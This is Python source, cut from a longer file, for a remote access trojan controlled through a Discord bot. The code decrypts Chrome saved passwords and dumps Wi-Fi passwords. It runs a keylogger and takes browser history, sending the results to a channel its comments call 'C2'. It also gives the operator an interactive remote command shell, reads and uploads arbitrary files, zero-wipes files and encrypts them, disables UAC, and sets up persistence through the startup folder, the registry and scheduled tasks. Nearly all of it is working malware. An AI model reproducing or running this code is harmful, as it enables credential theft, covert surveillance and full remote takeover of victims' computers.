            key_text = json.loads(local_state)["os_crypt"]["encrypted_key"]
        key_buffer = base64.b64decode(key_text)[5:]
        key = win32crypt.CryptUnprotectData(key_buffer)[1]
        return key
    except Exception as e:
        print(e)

# Login to db where creds are stored
def login_db(db_path):
    try:
        shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error
        sql_connection = sqlite3.connect(TEMP_DB)
        return sql_connection
    except Exception as e:
        print(e)

# Decrypt the password
def password_decrypt(secret_key, ciphertext):
    try:
        iv = ciphertext[3:15]
        password_hash = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        password = cipher.decrypt(password_hash).decode()
        return password
    except Exception as e:
        print(e)

@bot.command()
async def interactive_cmd(ctx):
    if ctx.channel == created_channel and ctx.message.content == "!interactive_cmd":
        # Check if the command was sent in a text channel and matches the command trigger
        initial_directory = "C:/Users"  # Replace with your actual directory path
        await ctx.send(f"Interactive command prompt started in {initial_directory}. Type `exit` to exit.")

        # Start a subprocess for the command prompt
        process = subprocess.Popen(
            ['cmd'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            cwd=initial_directory  # Set the initial directory
        )

        # Read and discard the initial copyright message
        while True:
            output_line = process.stdout.readline().decode('latin-1').strip()
            if not output_line or output_line.endswith(initial_directory + ">"):
                break

        async def read_output():
            while True:
                output_line = process.stdout.readline().decode('latin-1').strip()
                if not output_line or output_line.endswith(initial_directory + ">"):
                    break
                await ctx.send(f"```\n{output_line}\n```")

        try:
            while True:
                user_input = await bot.wait_for('message', check=lambda message: message.channel == created_channel)
                if user_input.content.lower() == 'exit':
                    await ctx.send("Interactive command prompt ended.")
                    break

                # Send user's input to the command prompt
                process.stdin.write(f"{user_input.content}\n".encode())
                process.stdin.flush()

                # Read the output of the previous command
                await read_output()

        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

        process.terminate()

@bot.command()
async def geolocate(ctx):
    if ctx.channel == created_channel and ctx.message.content == "!geolocate":
        await ctx.send("Calculating position...")
        gmaps = googlemaps.Client(GOOGLE_API_KEY)
        loc = gmaps.geolocate()
        latitude = loc['location']['lat']
        longitude = loc['location']['lng']
        accuracy_radius = loc['accuracy']  # Get the accuracy radius

        google_maps_link = f"https://maps.google.com/maps?q={latitude},{longitude}"
        await ctx.send(f"Google Maps Link: {google_maps_link}")
        await ctx.send(f"Accuracy Radius: {accuracy_radius} meters")

@bot.command()
async def messagebox(ctx, type, title, message):
    if ctx.channel == created_channel:
        try:
            if not type or not title or not message:
                await ctx.send("Please make sure you use the following syntax:\n!messagebox [type] [title] [message]")
            else:
                if type == "error":
                    await ctx.send("Messagebox sent **sucessfully**")
                    mb.showerror(title, message)

                elif type == "info":
                    await ctx.send("Messagebox sent **sucessfully**")
                    mb.showinfo(title, message)

                elif type == "warning":
                    await ctx.send("Messagebox sent **sucessfully**")
                    mb.showwarning(title, message)

        except Exception as e:
            await ctx.send(f"An error ocurred when showing messagebox:\n{e}")

# Network stealer
@bot.command()
async def network(ctx):
    if ctx.channel == created_channel and ctx.message.content == "!network":
        await ctx.send("Loading WiFi SSIDs and passwords...")
        nameListString = ""
        networkNames = subprocess.check_output("netsh wlan show profile", shell=True, text=True)
        networkNamesLines = networkNames.splitlines()
        for line in networkNamesLines:
            line.strip()
            if ':' in line:
                start = line.index(':') +1
                name = str(line[start:].strip())
                if len(name) > 1:
                    try:
                        checkInfo = f"netsh wlan show profile name=\"{name}\" key=clear"
                        nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)
                        nameInfo = nameInfo.splitlines()
                    except subprocess.CalledProcessError:
                        continue
                    password = "[!] Not Found!"
                    for i in nameInfo:
                        if "Key Content" in i:
                            start = i.index(":") +1
                            password = i[start:].strip()
                    nameListString += "\t\t" + name + "\t:\t" + password + "\n"
        await ctx.send(f"**Saved Networks [NAME : PASSWORD]**:\n\n {nameListString}")

def secure_delete_file(path_to_file):
    # Securely delete a file by setting its data to zero.
    CallME('fsutil.exe file setZeroData offset=0 length=9999999999 "' + path_to_file + '"')
    os.remove(path_to_file)

@bot.command()
async def securefile(ctx, path):
    if ctx.channel == created_channel:
        if not path:
            await ctx.send("Please provide path to file (!securefile <path-to-file>).")
            return
        try:
            secure_delete_file(path)
            await ctx.send("Successfully fucked file!")
            await ctx.message.add_reaction("\U0001F4A5")  # boom emoji
        except FileNotFoundError as fnfe:
            await ctx.send("The specified file was not found (" + str(fnfe) + ")")
            return

@bot.command()
async def sendkey(ctx, Key):
    if ctx.channel == created_channel:
        if not Key:
            await ctx.send("Please provide keys to be pressed (!SendKey <Hello-World\{ENTER\}>).")
            return

        await ctx.send("Creating .VBS script")

        # Change all "-" to " "
        Key = Key.replace("-", " ")

        # Create new .vbs script to send key
        script_path = r'C:\users\public\key.vbs'
        with open(script_path, 'w') as f:
            f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.SendKeys "{Key}"\n')

        # Execute .vbs script
        await ctx.send("Executing Script!")
        CallME(f'cscript "{script_path}"')

        await ctx.send("Sent key: " + Key)
        await ctx.send("Removing Script...")
        os.remove(script_path)
        await ctx.send("Script removed!")


# Create a variable to store the logged keys
logged_keys = []

# Define a global variable for the listener and is_logging
listener = None
is_logging = False

# Define keys that should trigger a new line
new_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])

def on_key_press(key):
    global is_logging
    if is_logging:
        try:
            # Check if the key is a modifier key and skip logging if it is
            if isinstance(key, keyboard.KeyCode):
                logged_key = key.char
            else:
                logged_key = f"[{str(key)}]"

            if key in new_line_keys:
                logged_keys.append("\n")  # Start a new line
            logged_keys.append(f"Key: {logged_key} ")
        except AttributeError:
            if key == keyboard.Key.space:
                logged_key = " "
            else:
                logged_key = f"[{str(key)}]"

            if key in new_line_keys:
                logged_keys.append("\n")  # Start a new line
            logged_keys.append(f"Key: {logged_key} ")

def start_logging():
    global listener, is_logging
    logged_keys.clear()  # Clear previously logged keys
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    is_logging = True
    print("Logging started...")

def stop_logging():
    global listener, is_logging
    if listener:
        listener.stop()
        with open("keylog.txt", "w") as logfile:
            logfile.write(" ".join(logged_keys))
        is_logging = False
        print("Logging stopped. Keys saved to 'keylog.txt'")

@bot.command()
async def startlog(ctx):
    if ctx.channel == created_channel:
        global is_logging
        if is_logging:
            await ctx.send("Logging is already started. Use **!dumplog** to see logs.")
        else:
            start_logging()
            await ctx.send("Logging started. Use **!dumplog** to see logs.")

@bot.command()
async def stoplog(ctx):
    if ctx.channel == created_channel:
        global is_logging
        if is_logging:
            stop_logging()
            await ctx.send("Logging stopped. Use **!dumplog** to see logs.")
        else:
            await ctx.send("Logging is already stopped. Use **!dumplog** to see logs.")

@bot.command()
async def dumplog(ctx):
    if ctx.channel == created_channel:
        global logged_keys
        if logged_keys:
            # Save the logged keys to a text file
            with open("keylog.txt", "w") as logfile:
                logfile.write("".join(logged_keys))

            # Send the log file as an attachment
            await ctx.send("Here is the log:", file=discord.File("keylog.txt"))

            # Delete the temporary log file
            os.remove("keylog.txt")
        else:
            await ctx.send("No keys have been logged yet.")

@bot.command()
async def restart(ctx):
    global created_channel
    if ctx.channel == created_channel:

        await ctx.send("Restarting...")

        # Determine the script filename dynamically
        script_filename = sys.argv[0]

        # Build the command to run the script with arguments
        script_command = [sys.executable, script_filename]

        # Start a new process to run the script
        subprocess.Popen(script_command)

        # Delete channel
        if created_channel:
            await created_channel.delete()

        # Exit the current script
        sys.exit()


def installNirsoft(zip_file_url, exe_file_name):
    # Destination path for the downloaded .zip file
    zip_download_path = r"C:\\Users\\Public\\archive.zip"

    # Directory where you want to extract the .exe file
    extraction_directory = r"C:\\Users\\Public"

    # Check if the .zip file already exists, and if not, download it
    if not os.path.exists(zip_download_path):
        try:
            # Download the .zip file
            response = requests.get(zip_file_url)
            with open(zip_download_path, 'wb') as file:
                file.write(response.content)
            print(f".zip File downloaded to {zip_download_path}")
        except Exception as e:
            print(f".zip File download failed: {str(e)}")

    # Extract the .exe file from the .zip archive
    try:
        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
            # Check if the .exe file exists in the archive
            if exe_file_name in zip_ref.namelist():
                zip_ref.extract(exe_file_name, extraction_directory)
                exe_path = os.path.join(extraction_directory, exe_file_name)
                print(f".exe File extracted to {exe_path}")
            else:
                print(f".exe file '{exe_file_name}' not found in the archive.")
    except Exception as e:
        print(f"Extraction of .exe file failed: {str(e)}")

def program_isInstalled(full_path_to_exe):
    return os.path.exists(full_path_to_exe)


@bot.command()
async def history(ctx):
    if ctx.channel == created_channel:
        # URL of the .zip file to download
        zip_file_url = "https://www.nirsoft.net/utils/browsinghistoryview.zip"

        # Destination path for the downloaded .zip file
        zip_download_path = r"C:\\Users\\Public\\archive.zip"

        # Directory where you want to extract the .exe file
        extraction_directory = r"C:\\Users\\Public"

        # Command to execute after extracting the .exe file
        command_to_execute = r'C:\Users\Public\BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml "C:\Users\Public\history.html"'

        # Delete the files that were created by the previous command
        # Check if any of the files (.html, .zip, .exe) exists
        if (os.path.exists(extraction_directory + "\\history.html") or os.path.exists(zip_download_path) or os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe")):
            # Delete the files
            # Check if history.html exists
            if os.path.exists(extraction_directory + "\\history.html"):
                os.remove(extraction_directory + "\\history.html")
            # Check if the .zip file exists
            if os.path.exists(zip_download_path):
                os.remove(zip_download_path)
            # Check if the .exe file exists
            if os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe"):
                os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
            print(".zip, .html, and .exe files deleted from last execution.")
            await ctx.send(f".zip, .html, and .exe files deleted from last execution.")
        else:
            print("No files to delete from last command.")
            await ctx.send("No files to delete from last command.")

        # Check if the .zip file already exists, and if not, download it
        if not os.path.exists(zip_download_path):
            try:
                # Download the .zip file
                response = requests.get(zip_file_url)
                with open(zip_download_path, 'wb') as file:
                    file.write(response.content)
                await ctx.send(f".zip File downloaded to {zip_download_path}")
                print(f".zip File downloaded to {zip_download_path}")
            except Exception as e:
                await ctx.send(f".zip File download failed: {str(e)}")
                print(f".zip File download failed: {str(e)}")

        # Extract the .exe file from the .zip archive
        try:
            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                # Specify the name of the .exe file you want to extract
                exe_file_name = "BrowsingHistoryView.exe"

                # Check if the .exe file exists in the archive
                if exe_file_name in zip_ref.namelist():
                    zip_ref.extract(exe_file_name, extraction_directory)
                    exe_path = os.path.join(extraction_directory, exe_file_name)
                    await ctx.send(f".exe File extracted to {exe_path}")
                    print(f".exe File extracted to {exe_path}")
                else:
                    await ctx.send(f".exe file '{exe_file_name}' not found in the archive.")
                    print(f".exe file '{exe_file_name}' not found in the archive.")
        except Exception as e:
            await ctx.send(f"Extraction of .exe file failed: {str(e)}")
            print(f"Extraction of .exe file failed: {str(e)}")

        # Execute the command using the extracted .exe file
        try:
            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)
            success_message = "Command executed successfully."
            print(success_message)
            await ctx.send(success_message)

            # Send file to C2
            await ctx.send("Sent file to C2", file=discord.File(extraction_directory + "\\history.html"))

            # Delete the archive (.zip) and the extracted .exe file
            os.remove(extraction_directory + "\\history.html")
            os.remove(zip_download_path)
            os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
            print(".zip, .html, and .exe files deleted.")
            await ctx.send(".zip, .html, and .exe files deleted.")
        except Exception as e:
            error_message = f"Command execution failed: {str(e)}"
            print(error_message)
            await ctx.send("Error: " + error_message)

@bot.command()
async def volume(ctx, volume_amount):
    if ctx.channel == created_channel:
        try:
            volume_amount = int(volume_amount)  # Convert the input to an integer

            if program_isInstalled("C:\\Users\\Public\\nircmd.exe"):
                await ctx.send(f"NirCMD is installed and ready!")

                if (0 <= volume_amount <= 100):
                    # Calculate from percentage to NirCMD volume (1% being 655)
                    volume_level = volume_amount * 655

                    try:
                        command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                        os.system(command)
                        await ctx.send(f"Volume changed to {volume_amount}%.")
                        await ctx.send(f"Removing NirCMD...")
                        if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                            os.remove("C:\\Users\\Public\\nircmd.exe")
                        if (os.path.exists("C:\\users\\public\\archive.zip")):
                            os.remove("C:\\users\\public\\archive.zip")
                        await ctx.send(f"NirCMD removed!")
                    except Exception as e:
                        await ctx.send(f"An error occurred while changing the volume: {e}")
                else:
                    await ctx.send("Volume amount must be between 0 and 100.")
            else:
                await ctx.send("NirCMD is not installed, installing it now!")

                # Install NirCMD om man inte har det
                installNirsoft("https://www.nirsoft.net/utils/nircmd.zip", "nircmd.exe")

                await ctx.send("NirCMD has been installed.")
                if (0 <= volume_amount <= 100):
                    # Calculate from procentage to NirCMD volume (1% being 655)
                    volume_level = volume_amount * 655

                    try:
                        command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                        os.system(command)
                        await ctx.send(f"Volume changed to {volume_amount}%.")
                        await ctx.send(f"Removing NirCMD...")
                        if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                            os.remove("C:\\Users\\Public\\nircmd.exe")
                        if (os.path.exists("C:\\users\\public\\archive.zip")):
                            os.remove("C:\\users\\public\\archive.zip")
                        await ctx.send(f"NirCMD removed!")
                    except Exception as e:
                        await ctx.send(f"An error occurred while changing the volume: {e}")
                else:
                    await ctx.send("Volume amount must be between 0 and 100.")
        except ValueError:
            await ctx.send("Invalid volume amount. Please provide a number between 0 and 100.")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

@bot.command()
async def install(ctx):
    if ctx.channel == created_channel and ctx.message.content == '!install':
        print("Received !install command")
        await ctx.send("Installing the bot on startup...")

        try:
            # Check if the operating system is Windows
            if platform.system() == "Windows":
                print("Operating system is Windows")
                await ctx.send("Client is using Windows...")

                script_path = os.path.abspath(__file__)
                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

                try:
                    if running_as_executable:
                        await ctx.send("Client has the **.exe** extension on payload.")
                        # If the script is an executable
                        executable_path = sys.executable
                        executable_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                        shutil.copy2(executable_path, executable_link_path)
                        print(f"Executable copied to: {executable_link_path}")
                    else:
                        # If the script is a .py file
                        if script_path.endswith('.py'):
                            await ctx.send("Client has the **.py** extension on payload.")
                            # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                            public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                            os.makedirs(public_folder, exist_ok=True)
                            await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                            duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.py")
                            shutil.copy2(script_path, duplicate_script_path)
                            await ctx.send("Copied .py file from **" + script_path + "** to **" + duplicate_script_path + "**")

                            # Create a batch script to run the duplicate .py script
                            batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                            batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                            with open(batch_script_path, 'w') as batch_file:
                                batch_file.write(batch_script_content)
                            print(f"Batch script created at: {batch_script_path}")
                            await ctx.send(f"Batch script created at: **{batch_script_path}**")
                        elif script_path.endswith('.pyw'):
                            await ctx.send("Client has the **.pyw** extension on payload.")
                            # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                            public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                            os.makedirs(public_folder, exist_ok=True)
                            await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                            duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.pyw")
                            shutil.copy2(script_path, duplicate_script_path)
                            await ctx.send("Copied .pyw file from **" + script_path + "** to **" + duplicate_script_path + "**")

                            # Create a batch script to run the duplicate .py script
                            batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                            batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                            with open(batch_script_path, 'w') as batch_file:
                                batch_file.write(batch_script_content)
                            print(f"Batch script created at: {batch_script_path}")
                            await ctx.send(f"Batch script created at: **{batch_script_path}**")
                        else:
                            await ctx.send("Client has the **.exe** extension on payload.")
                            # If the script is an .exe file
                            exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                            shutil.copy2(script_path, exe_link_path)
                            print(f"Executable copied to: **{exe_link_path}**")

                    await ctx.send("Bot installed on startup!")
                    print("Bot installed on startup!")
                except Exception as copy_error:
                    await ctx.send(f"An error occurred while copying the script: {copy_error}")
                    print(f"An error occurred while copying the script: {copy_error}")
            else:
                await ctx.send("This feature is only supported on Windows.")
                print("This feature is only supported on Windows.")
        except Exception as os_error:
            await ctx.send(f"An error occurred while checking the operating system: {os_error}")
            print(f"An error occurred while checking the operating system: {os_error}")

@bot.command()
async def uninstall(ctx):
    if ctx.channel == created_channel and ctx.message.content == '!uninstall':
        print("Received !uninstall command")
        await ctx.send("Uninstalling the bot...")

        try:
            # Check if the operating system is Windows
            if platform.system() == "Windows":
                print("Operating system is Windows")
                await ctx.send("Client is using Windows")

                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                # Remove the batch script and executable link
                if os.path.exists(batch_script_path):
                    secure_delete_file(batch_script_path)
                    print(f"Batch script removed: {batch_script_path}")
                    await ctx.send(f"Batch script removed: **{batch_script_path}**")
                if os.path.exists(exe_link_path):
                    secure_delete_file(exe_link_path)
                    print(f"Executable link removed: {exe_link_path}")
                    await ctx.send(f"Executable link removed: **{exe_link_path}**")

                # Display a message indicating that persistence has been removed
                await ctx.send("Bot persistence removed!")
                print("Bot persistence removed!")
            else:
                await ctx.send("This feature is only supported on Windows.")
                print("This feature is only supported on Windows.")
        except Exception as e:
            await ctx.send(f"An error occurred while uninstalling: {e}")
            print(f"An error occurred while uninstalling: {e}")

@bot.command()
async def elevate(ctx):
    if ctx.channel == created_channel:
        if is_admin():
            await ctx.send("User has administrative privileges.")
        else:
            return await ctx.send(elevate_privileges())

@bot.command()
async def cat(ctx, file_name):
    if ctx.channel == created_channel:
        try:
            with open(file_name, 'r') as file:
                file_content = file.read()
                await ctx.send(f"Content of '{file_name}':\n```\n{file_content}\n```")
        except Exception as e:
            await ctx.send(f"An error occurred while reading the file: {e}")

@bot.command()
async def upload(ctx):
    if ctx.channel == created_channel and ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        await attachment.save(attachment.filename)
        await ctx.send(f"File '{attachment.filename}' uploaded successfully.")
    elif not ctx.messege.attachments:
        await ctx.send(f"File did not upload, you did not attach any files...")

# Function to generate a Fernet key from a password
def generate_key_from_password(password, salt=None):
    if salt is None:
        salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=100000,  # You can adjust the number of iterations as needed
        salt=salt,
        length=32  # Length of the derived key
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key, salt

# Function to encrypt a file
def encrypt_file(input_file, password):
    try:
        key, salt = generate_key_from_password(password)
        fernet = Fernet(key)

        with open(input_file, 'rb') as file:
            file_data = file.read()

        encrypted_data = fernet.encrypt(file_data)

        # Use the same filename for the encrypted file
        with open(input_file, 'wb') as encrypted_file:
            encrypted_file.write(salt + encrypted_data)

        return input_file  # Return the updated input file name
    except InvalidToken:
        return "Invalid token (key or password)"

# Function to decrypt a file
def decrypt_file(input_file, password):
    try:
        with open(input_file, 'rb') as encrypted_file:
            salt = encrypted_file.read(16)  # Read the salt
            encrypted_data = encrypted_file.read()

        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key

        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)

        # Use the same filename for the decrypted file
        with open(input_file, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)

        return input_file  # Return the updated input file name
    except InvalidToken:
        return "Invalid token (key or password)"

@bot.command()
async def encrypt(ctx, input_file, password):
    if ctx.channel == created_channel:
        encrypted_file_name = encrypt_file(input_file, password)
        await ctx.send(f'File encrypted and saved as {encrypted_file_name}')
        return encrypted_file_name

@bot.command()
async def decrypt(ctx, input_file, password):
    if ctx.channel == created_channel:
        decrypted_file_name = decrypt_file(input_file, password)
        if decrypted_file_name != "Invalid token (key or password)":
            await ctx.send(f'File decrypted and saved as {decrypted_file_name}')
        else:
            await ctx.send(decrypted_file_name)

def has_persistence():
    # Check if the bot has persistence using either the .py or .exe method
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
    exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')

def has_better_persistence():
    if Path(f"C:\\users\\public\\{publicFileName}.pyw").exists():
        print("Noted: Client has the .pyw file in Public directory.")
        # Check if the client has persistence using all methods (registry, task scheduler, startup folder) 
        persistence_results = CheckBetterPersistence(script_path)

        # Check if all persistence mechanisms are detected
        return all(persistence_results.values())
    else:
        print("Client does not have persistence. (Specifically, does not have the .pyw file in Public directory)")
        return False

def get_system_info():
    try:
        script_path = os.path.abspath(sys.argv[0])
        info = []
        info.append(f"System: {platform.system()}")
        info.append(f"Node Name: {platform.node()}")
        info.append(f"Release: {platform.release()}")
        info.append(f"Version: {platform.version()}")
        info.append(f"Machine: {platform.machine()}")
        info.append(f"Processor: {platform.processor()}")

        # Memory information
        memory = psutil.virtual_memory()
        info.append(f"Memory Total: {convert_bytes(memory.total)}")
        info.append(f"Memory Available: {convert_bytes(memory.available)}")
        info.append(f"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)")

        # Disk information
        partitions = psutil.disk_partitions()
        for partition in partitions:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            info.append(f"Disk {partition.device} ({partition.mountpoint}):")
            info.append(f"  Total: {convert_bytes(partition_usage.total)}")
            info.append(f"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)")

        # Additional system information
        info.append(f"Username: {os.getlogin()}")
        info.append(f"Device Name: {platform.node()}")
        info.append(f"IsAdmin: {is_admin()}")
        # Check if the bot has installed persistence (.py or .exe)
        info.append(f"Has Persistence (Reg): {check_registry_persistence(script_path)}")
        info.append(f"Has Persistence (Task): {check_task_scheduler_persistence(script_path)}")
        info.append(f"Has Persistence (Startup): {check_startup_persistence(script_path)}")
        # check if the bot has installed persistence with cool methods (.pyw)
        info.append(f"Has Cool Persistence: {cool_persistence_exists()}")

        private_ip = socket.gethostbyname(socket.gethostname())
        info.append(f"Private IP: {private_ip}")
        info.append(f"Public IP: {GetPublicIP()}")
        info.append(f"Keylogger Activated: {is_logging}")

        return '\n'.join(info)
    except Exception as e:
        return f"An error occurred while fetching system information: {e}"

def convert_bytes(bytes_value):
    # Convert bytes to human-readable format
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_value < 1024:
            return f"{bytes_value:.2f} {unit}"
        bytes_value /= 1024
    return f"{bytes_value:.2f} PB"

def GetPublicIP():
    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
    return ip_address

def GetLocalIP():
    private_ip = socket.gethostbyname(socket.gethostname())
    return private_ip

def CallME(argument):
    try:
        result = subprocess.run(argument, shell=True, text=True, capture_output=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return f"Command exited with status code {result.returncode}.\n{result.stderr}"
    except Exception as e:
        return f"An error occurred: {e}"

async def DownloadFile(file_name, channel):
    try:
        with open(file_name, 'rb') as file:
            file_content = file.read()
            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))
            await channel.send(f"File '{file_name}' uploaded and available for download.")
    except Exception as e:
        await channel.send(f"An error occurred while uploading the file: {e}")

# check and ask for elevation
# Function for trying to run the script elevated
def elevate_privileges():
    try:
        admin_pass = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        if admin_pass > 32:
            return "Success! You should recive a new connection with a Elevated Client." and os._exit(0)
        else:
            return "User pressed \"No\". Privilege elevation not successful"
    except Exception as e:
        return f"Failed to elevate privileges: {e}"

# Function for getting if user is elevated or not
def is_admin():
    try:
        # Check if the current process has administrative privileges
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


# ------------------------------------------------------------
#
#                    SETTINGS STARTS HERE
#
# ------------------------------------------------------------

# The part that runs on start, asking for elevation.
if askForUACOnStart:
    if is_admin():
        print("User has administrative privileges already...")
    else:
        print("User does not have administrative privileges. Requesting it now!")
        elevate_privileges()
else:
    print("Does not try to ask for UAC on start")

# Disable uac on start or not...
if disableUACOnStart:
    print("Trying to disable UAC on start...")
    try:
        # Check if the operating system is Windows
        if platform.system() == "Windows":
            print("Operating system is Windows")

            # Check if the client has administrative privileges
            if is_admin():
                print("User has administrative privileges.")
                try:
                    # Disable UAC
                    CallME('powershell.exe Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0')
                    print("UAC disabled!")
                except Exception as e:
                    print(f"An error occurred while disabling UAC: {e}")
            else:
                print("User does not have administrative privileges.")
        else:
            print("This feature is only supported on Windows.")
    except Exception as os_error:
        print(f"An error occurred while checking the operating system: {os_error}")
else:
    print("Does not disable UAC on start!")

# Try to install on start or not..
if installOnStart:
    if has_better_persistence():
        print("Client already has persistence, there is no need to install again.")
    else:
        print("Trying to install on start...")
        try:
            # Check if the operating system is Windows
            if platform.system() == "Windows":
                print("Operating system is Windows")

                # Check if the cloned script is in the public directory
                public_directory = Path('C:/Users/Public')
                copied_script_path = public_directory / (publicFileName + ".pyw")
                if (Path(script_path) != copied_script_path):
                    print("Duplicated Script is not in the public directory. Copying...")
                    # Copy the script to the public directory
                    shutil.copy(script_path, copied_script_path)
                    print(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                else:
                    print(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                current_status = CheckBetterPersistence(script_path)
                # Check and enable Registry Persistence if not already enabled
                if not current_status['registry_persistence']:
                    try:
                        print("Starting Registry Persistence phase...")
                        registry_persistence(script_path)
                        print("Registry Persistence done!")
                    except Exception as e:
                        print(f"Error starting registry persistence: {e}")
                else:
                    print("Registry Persistence is already active.")

                # Check and enable Task Scheduler Persistence if not already enabled
                if not current_status['task_scheduler_persistence']:
                    try:
                        print("Starting Task Scheduler Persistence phase...")
                        task_scheduler_persistence(script_path)
                        print("Task Scheduler Persistence done!")
                    except Exception as e:
                        print(f"Error starting task scheduler persistence: {e}")
                else:
                    print("Task Scheduler Persistence is already active.")

                # Check and enable Startup Persistence if not already enabled
                if not current_status['startup_persistence']:
                    try:
                        print("Starting Startup Persistence phase...")
                        startup_persistence(script_path)
                        print("Startup Persistence done!")
                    except Exception as e:
                        print(f"Error starting startup persistence: {e}")
                else:
                    print("Startup Persistence is already active.")

                print("\n**Done with all phases! \nChecking status...**\n")
            else:
                print("This feature is only supported on Windows.")
        except Exception as os_error:
            print(f"An error occurred while checking the operating system: {os_error}")
else:
    print("Does not install on start!")

# Try to hide window:
if hideConsoleOnStart:
    try:
        print("Trying to hide window...")
        # Run the command in the current console
        try:
            subprocess.run("DeviceCredentialDeployment", shell=True)
        except Exception as e:
            print(f"An error occurred while hiding window: {e}")
        print("Window hidden!")
    except Exception as e:
        print(f"An error occurred while hiding window: {e}")
else:
    print("Does not hide window!")

# ------------------------------------------------------------
#
#                     SETTINGS ENDS HERE
#
# ------------------------------------------------------------

# Try to start bot using primary token and if that fails, try alternative token
# Function to start the bot with a given token
async def start_bot(token):
    try:
        print(f"Trying to start bot...")
        await bot.start(token)
    except discord.LoginFailure:
        print(f"Improper token has been passed.")
        raise  # Re-raise the exception to handle it in the calling code
    except aiohttp.ClientConnectionError:
        print(f"Connection error occurred. Check your internet connection.")
    except Exception as e:
        print(f"An error occurred: {e}")


# Try to start bot using primary token and if that fails, try alternative token
async def main(): 
    while True:
        try:
            await start_bot(primary_token)
            break  # If successful, break the loop
        except discord.LoginFailure:
            try:
                await start_bot(alternative_token)
                break  # If successful, break the loop
            except discord.LoginFailure as e:
                print(f"Both primary and alternative tokens failed. Error: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")
        print("Waiting for 3 seconds before retrying...")
        await asyncio.sleep(3)  # Wait for 3 seconds before retrying

# Run the asynchronous main function
asyncio.run(main())